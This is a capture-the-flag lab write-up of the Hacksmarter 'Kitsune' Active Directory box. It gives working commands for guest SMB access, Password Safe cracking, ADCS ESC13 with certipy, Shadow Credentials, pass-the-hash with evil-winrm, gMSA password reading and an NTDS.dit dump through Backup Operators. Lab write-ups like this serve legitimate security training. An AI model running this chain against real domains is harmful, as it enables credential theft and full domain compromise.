---
title: "Hacksmarter Kitsune Writeup"
date: 2026-10-22 19:54:00 +0200
description: "Guest SMB access, cracking Password Safe, ADCS ESC13, Shadow Credentials, gMSA abuse and Backup Operators."
categories: [Hacksmarter]
tags: [active-directory, adcs, esc13, certipy, bloodhound, shadow-credentials, gmsa, backup-operator, impacket, evil-winrm]
media_subpath: /assets/kitsune-img
---
Hello to my Kitsune writeup from Hacksmarter. Our objective is to perform internal pentest against the client's Domain Controller, identify all vulnerabilities and (if possible) fully compromise the Domain. This is pure Active directory so we are starting from guest authentication to grab pwsafe file, crack it and get foothold. Next we are using certipy-ad to perform ESC13 attack and with ticket we created we can do shadow credentials attack to get NT hash of another user. Using evil-winrm we see .cred file which contained another credentials. Quick google search leading us to decrypt password and read GMSA passwords which leads to domain compromise with Backup Operator of svc_gmsa$ user.  

## Guest access to the domain controller

We are able to authenticate to the domain controller using the `guest` account. As a guest, we have access to a non-default share named `Files`.

![Accessing the Files share as guest](01-guest-smb-files-share.png)

```bash
impacket-smbclient kitsune.local/guest:''@10.1.235.82 -no-pass
use Files
```

![Contents of the Files share](02-files-share-contents.png)

We can see a `psafe3` file, which is an encrypted database used by Password Safe. We can use `pwsafe2john` and `john` to crack the password protecting this database.

## Cracking the Password Safe database

```bash
pwsafe2john logins.psafe3 > logins.psafe3.hash
john --wordlist=/opt/seclists/Passwords/Leaked-Databases/rockyou.txt logins.psafe3.hash
```

![Cracking the Password Safe database](03-john-psafe3-crack.png)

We can now browse the usernames and passwords stored in the database. One set of credentials can be used to authenticate to the domain controller.

![Credentials recovered from Password Safe](04-password-safe-credentials.png)

## Active Directory reconnaissance

Next, we run BloodHound with rusthound-ce to check whether there is anything interesting across the Active Directory edges.

```bash
rusthound-ce -d kitsune.local -u ranch -p '<REDACTED>' -f DC01.kitsune.local -c All -z --ldaps
```

We spot a custom certificate template named `Kitsune-User`.

![The Kitsune-User template in BloodHound](05-bloodhound-kitsune-user-template.png)

## ADCS — ESC13

We run `certipy-ad` to check whether we can abuse this certificate.

```bash
certipy-ad find -u ranch@kitsune.local -p '<REDACTED>' -dc-host DC01.kitsune.local -stdout -vulnerable
```

![Vulnerable certificate templates found by Certipy](06-certipy-vulnerable-templates.png)

We use the ESC13 technique described in [The Hacker Recipes](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc13-issuance-policiy-with-privileged-group-linked) to escalate privileges.

```bash
certipy-ad req -u ranch@kitsune.local -p '<REDACTED>' -target DC01.kitsune.local -ca kitsune-DC01-CA -template Kitsune-User -dns-tcp -key-size 4096
```

![Requesting a certificate from the Kitsune-User template](07-certipy-request-esc13.png)

We have to use `-key-size 4096`, otherwise we get the following error:

```
[-] Got error while requesting certificate: code: 0x80094811 - CERTSRV_E_KEY_LENGTH - The public key does not meet the minimum size required by the specified certificate template.
```

Using Certipy, we can obtain a `ccache` file from the `pfx` created during the attack.

![Converting the pfx to a ccache](08-certipy-pfx-to-ccache.png)

## Shadow Credentials

The ticket created during the attack is linked to the `HelpDesk` group. Looking at BloodHound, we can see that membership in `HelpDesk` gives us `GenericAll` over the `schlop` user.

![HelpDesk has GenericAll over schlop](09-bloodhound-helpdesk-genericall.png)

We can now use the Shadow Credentials attack to obtain the user's NT hash.

```bash
KRB5CCNAME=ranch.ccache certipy-ad shadow auto -dc-host DC01.kitsune.local -u ranch@kitsune.local -k -account schlop
```

![Shadow Credentials — taking over the schlop account](10-shadow-credentials.png)

Looking at BloodHound again, we see that `schlop` is a member of `Remote Management Users`, so we can use evil-winrm with pass-the-hash to gain access to the machine.

```bash
evil-winrm -u schlop -H <REDACTED> -i DC01.kitsune.local
```

![Access via evil-winrm](11-evil-winrm.png)

## From schlop to pebble

In the `Documents` directory we find a `.cred` file containing encrypted credentials for the `pebble` user.

![The networkAuth.cred file in the Documents directory](12-schlop-documents-cred.png)

A quick search turned up that these credentials can be easily decrypted with `Import-Clixml`.

```powershell
$cred = Import-Clixml -Path "C:\Users\schlop\Documents\networkAuth.cred"
$cred.GetNetworkCredential().Password
```

![Decrypted credentials of the pebble user](13-import-clixml.png)

Looking at BloodHound, we can see that `pebble` is able to read gMSA passwords. We can retrieve them using `nxc`.

```bash
nxc ldap kitsune.local -u pebble -p <REDACTED> --gmsa
```

![Reading the gMSA password](14-nxc-gmsa.png)

We can see that `svc_gmsa$` is a member of `Backup Operators`.

![svc_gmsa$ in the Backup Operators group](15-backup-operators.png)

## Domain compromise

We can use the `nxc` module of the same name to dump the SAM, SYSTEM and SECURITY hives, obtain the domain administrator hash and exfiltrate the entire `NTDS.dit` file.

```bash
nxc smb kitsune.local -u svc_gmsa$ -H <REDACTED> -M backup_operator
```

![Dumping NTDS.dit with the backup_operator module](16-backup-operator-ntds.png)

And that is how the domain was compromised.
